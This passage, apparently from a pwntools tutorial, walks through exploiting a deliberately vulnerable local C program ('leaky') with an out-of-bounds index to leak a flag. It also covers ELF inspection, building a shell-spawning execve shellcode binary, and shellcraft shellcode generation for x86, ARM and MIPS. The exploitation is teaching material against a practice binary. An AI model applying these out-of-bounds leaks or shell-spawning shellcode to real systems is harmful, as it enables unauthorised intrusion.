</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>digits</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>10</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>{</span><span style=color:#4e9a06>&#39;0&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;1&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;2&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;3&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;4&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;5&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;6&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;7&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;8&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;9&#39;</span><span style=color:#000;font-weight:700>};</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>index</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>while</span> <span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Give me an index and I&#39;ll tell you what&#39;s there!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>		<span style=color:#000>scanf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;%d&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#ce5c00;font-weight:700>&amp;</span><span style=color:#000>index</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Okay, here you go: %p %c</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#ce5c00;font-weight:700>&amp;</span><span style=color:#000>digits</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>index</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>digits</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>index</span><span style=color:#000;font-weight:700>]);</span>
</span></span><span style=display:flex><span>	<span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>Let&rsquo;s leak one byte of the flag using pwntools.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>io</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;leaky&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># &#34;Give me an index and I&#39;ll tell you what&#39;s there!\n</span>
</span></span><span style=display:flex><span><span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Send offset -10</span>
</span></span><span style=display:flex><span><span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;-10&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Here you go\n</span>
</span></span><span style=display:flex><span><span style=color:#000>result</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;Got: &#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>result</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>interactive</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><p>If we run the previous script, we get the following output:</p><pre tabindex=0><code>[+] Starting local process &#39;./leaky&#39;: Done
Got: Okay, here you go: 0xffe947d8 S

[*] Switching to interactive mode
[*] Process &#39;./leaky&#39; stopped with exit code 0
[*] Got EOF while reading in interactive
$
</code></pre><p>Notice the $ prompt which still awaits input from us to feed the process. This is due to the <code>io.interactive()</code> line at the end of the script.</p><p>We can encapsulate the previous sequence of interactions inside a function which we can loop.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>leak_char</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>offset</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># &#34;Give me an index and I&#39;ll tell you what&#39;s there!\n</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Send offset</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87>str</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>offset</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Here you go\n</span>
</span></span><span style=display:flex><span>    <span style=color:#000>result</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Parse the result</span>
</span></span><span style=display:flex><span>    <span style=color:#000>leaked_char</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>result</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;go: &#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39; &#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>leaked_char</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>io</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;leaky&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>flag</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>for</span> <span style=color:#000>i</span> <span style=color:#204a87;font-weight:700>in</span> <span style=color:#204a87>range</span><span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>10</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>    <span style=color:#000>flag</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>leak_char</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>)</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>decode</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;utf-8&#34;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;The flag is: &#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>flag</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>close</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><p>If we run this script, we leak the flag.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./demo_pwn.py
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>[</span>+<span style=color:#ce5c00;font-weight:700>]</span> Starting <span style=color:#204a87>local</span> process <span style=color:#4e9a06>&#39;./leaky&#39;</span>: Done
</span></span><span style=display:flex><span>The flag is: SECRETFLAG
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>[</span>*<span style=color:#ce5c00;font-weight:700>]</span> Stopped program <span style=color:#4e9a06>&#39;./leaky&#39;</span>
</span></span></code></pre></div><h2 id=logging>Logging</h2><hr><p>The previous example was a bit… quiet. Fortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes. Let&rsquo;s log each of our steps within the <code>leak_char</code> function.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>leak_char</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>offset</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># &#34;Give me an index and I&#39;ll tell you what&#39;s there!\n</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Send offset</span>
</span></span><span style=display:flex><span>    <span style=color:#000>log</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>info</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Sending request for offset: &#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#204a87>str</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>offset</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87>str</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>offset</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Here you go\n</span>
</span></span><span style=display:flex><span>    <span style=color:#000>result</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvline</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span>    <span style=color:#000>log</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>info</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Got back raw response: </span><span style=color:#4e9a06>{}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>result</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Parse the result</span>
</span></span><span style=display:flex><span>    <span style=color:#000>leaked_char</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>result</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;go: &#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39; &#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>split</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#39;</span><span style=color:#000;font-weight:700>)[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>    <span style=color:#000>log</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>info</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Parsed char: </span><span style=color:#4e9a06>{}</span><span style=color:#4e9a06>&#34;</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>format</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>leaked_char</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>leaked_char</span>
</span></span></code></pre></div><p>Now the output should be much more verbose:</p><pre tabindex=0><code>[+] Starting local process &#39;./leaky&#39;: Done
[*] Sending request for offset: -10
[*] Got back raw response: Okay, here you go: 0xffb14948 S
[*] Parsed char: S
[*] Sending request for offset: -9
[*] Got back raw response: Okay, here you go: 0xffb14949 E
[*] Parsed char: E
[*] Sending request for offset: -8
[*] Got back raw response: Okay, here you go: 0xffb1494a C
[*] Parsed char: C
[*] Sending request for offset: -7
[*] Got back raw response: Okay, here you go: 0xffb1494b R
[*] Parsed char: R
[*] Sending request for offset: -6
[*] Got back raw response: Okay, here you go: 0xffb1494c E
[*] Parsed char: E
[*] Sending request for offset: -5
[*] Got back raw response: Okay, here you go: 0xffb1494d T
[*] Parsed char: T
[*] Sending request for offset: -4
[*] Got back raw response: Okay, here you go: 0xffb1494e F
[*] Parsed char: F
[*] Sending request for offset: -3
[*] Got back raw response: Okay, here you go: 0xffb1494f L
[*] Parsed char: L
[*] Sending request for offset: -2
[*] Got back raw response: Okay, here you go: 0xffb14950 A
[*] Parsed char: A
[*] Sending request for offset: -1
[*] Got back raw response: Okay, here you go: 0xffb14951 G
[*] Parsed char: G
[*] The flag is: SECRETFLAG
[*] Stopped program &#39;./leaky&#39;
</code></pre><h2 id=assembly-and-elf-manipulation>Assembly and ELF manipulation</h2><hr><p>Pwntools can also be used for precision work, like working with ELF files and their symbols.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>leaky_elf</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;leaky&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>main_addr</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>leaky_elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;main&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Print address of main</span>
</span></span><span style=display:flex><span><span style=color:#000>log</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>info</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Main at: &#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#204a87>hex</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>main_addr</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Disassemble the first 14 bytes of main</span>
</span></span><span style=display:flex><span><span style=color:#000>log</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>info</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>disasm</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>leaky_elf</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>main_addr</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>14</span><span style=color:#000;font-weight:700>),</span> <span style=color:#000>arch</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#39;x86&#39;</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><p>We can also write ELF files from raw assembly; this is very useful for testing shellcodes.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>sh_shellcode</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        mov eax, 11
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        push 0
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        push 0x68732f6e
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        push 0x69622f2f
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        mov ebx, esp
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        mov ecx, 0
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        mov edx, 0
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>        int 0x80
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>e</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>from_assembly</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>sh_shellcode</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>vma</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#0000cf;font-weight:700>0x400000</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>with</span> <span style=color:#204a87>open</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;test_shell&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;wb&#39;</span><span style=color:#000;font-weight:700>)</span> <span style=color:#204a87;font-weight:700>as</span> <span style=color:#000>f</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span>    <span style=color:#000>f</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>write</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>e</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get_data</span><span style=color:#000;font-weight:700>())</span>
</span></span></code></pre></div><blockquote><p>This will result in a binary named test_shell which executes the necessary assembly code to spawn a shell.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ chmod u+x test_shell
</span></span><span style=display:flex><span>$ ./test_shell
</span></span></code></pre></div></blockquote><h2 id=shellcode-generation>Shellcode generation</h2><hr><p>Pwntools comes with the <code>shellcraft</code> module, which is quite extensive in its capabilities.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>20</span><span style=color:#000;font-weight:700>))</span> <span style=color:#8f5902;font-style:italic># Construct a shellcode which reads from stdin to a buffer on the stack 20 bytes</span>
</span></span><span style=display:flex><span>    <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#000>call</span> <span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x14</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>SYS_read</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#0000cf;font-weight:700>3</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span>    <span style=color:#000>xor</span> <span style=color:#000>ebx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>ebx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span>
</span></span><span style=display:flex><span>    <span style=color:#000>pop</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#0000cf;font-weight:700>0x14</span>
</span></span><span style=display:flex><span>    <span style=color:#000>pop</span> <span style=color:#000>edx</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87>int</span> <span style=color:#0000cf;font-weight:700>0x80</span>
</span></span></code></pre></div><p>It also works with other architectures:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>arm</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>20</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>    <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#000>call</span> <span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>4294962864</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>20</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#000>eor</span>  <span style=color:#000>r0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>r0</span> <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#0000cf;font-weight:700>0</span> <span style=color:#000;font-weight:700>(</span><span style=color:#8f5902;font-style:italic>#0) */</span>
</span></span><span style=display:flex><span>    <span style=color:#000>movw</span> <span style=color:#000>r1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#8f5902;font-style:italic>#0xffffeeb0 &amp; 0xffff</span>
</span></span><span style=display:flex><span>    <span style=color:#000>movt</span> <span style=color:#000>r1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#8f5902;font-style:italic>#0xffffeeb0 &gt;&gt; 16</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span>  <span style=color:#000>r2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#8f5902;font-style:italic>#0x14</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span>  <span style=color:#000>r7</span><span style=color:#000;font-weight:700>,</span> <span style=color:#8f5902;font-style:italic>#(SYS_read) /* 3 */</span>
</span></span><span style=display:flex><span>    <span style=color:#000>svc</span>  <span style=color:#0000cf;font-weight:700>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>mips</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>20</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span>    <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#000>call</span> <span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x14</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#000>slti</span> <span style=color:#a40000>$</span><span style=color:#000>a0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>$</span><span style=color:#000>zero</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xFFFF</span> <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#a40000>$</span><span style=color:#000>a0</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#000>li</span> <span style=color:#a40000>$</span><span style=color:#000>a1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0xffffeeb0</span>
